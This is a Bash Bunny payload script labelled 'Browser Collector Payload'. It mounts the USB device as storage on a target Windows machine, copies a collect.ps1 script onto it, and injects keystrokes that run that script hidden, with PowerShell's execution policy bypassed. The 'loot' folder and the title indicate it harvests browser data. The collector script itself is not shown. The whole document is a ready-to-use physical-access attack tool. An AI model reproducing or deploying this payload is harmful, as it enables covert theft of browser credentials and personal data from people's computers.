#!/bin/bash

# --------------------------
#   Browser Collector Payload
# --------------------------

LED SETUP

# Expose Bash Bunny storage to target
ATTACKMODE STORAGE
sleep 5   # allow Windows to mount the drive


# ---------------------------------------------
# Determine where the Bunny storage is mounted
# ---------------------------------------------
BUNNY_DRIVE=""
for drive in /mnt/*; do
    if [ -d "$drive/loot" ]; then
        BUNNY_DRIVE="$drive"
        break
    fi
done

if [ -z "$BUNNY_DRIVE" ]; then
    LED FAIL
    exit
fi


# ---------------------------------------------
# Copy collect.ps1 into the Bunny storage
# ---------------------------------------------
cp /root/udisk/payloads/$SWITCH_POSITION/collect.ps1 "$BUNNY_DRIVE/collect.ps1"


LED ATTACK

# ---------------------------------------------
# Execute collect.ps1 on the target system
# ---------------------------------------------
QUACK STRING "powershell -ExecutionPolicy Bypass -NoP -W Hidden -File \"$BUNNY_DRIVE\\collect.ps1\""
QUACK ENTER


# Optional delay (adjust if needed)
sleep 20


LED FINISH
